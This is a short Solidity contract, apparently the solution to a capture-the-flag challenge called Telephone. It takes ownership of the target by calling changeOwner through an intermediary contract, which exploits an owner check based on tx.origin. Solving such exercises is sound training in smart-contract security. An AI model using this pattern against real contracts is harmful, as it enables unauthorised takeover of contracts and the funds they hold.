// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./04Telephone.sol";

contract TelephoneSolution {
    Telephone public telephone;

    constructor(address telephoneAddress) {
        telephone = Telephone(telephoneAddress);
    }

    function solveChallenge() public {
        telephone.changeOwner(msg.sender);
    }
}
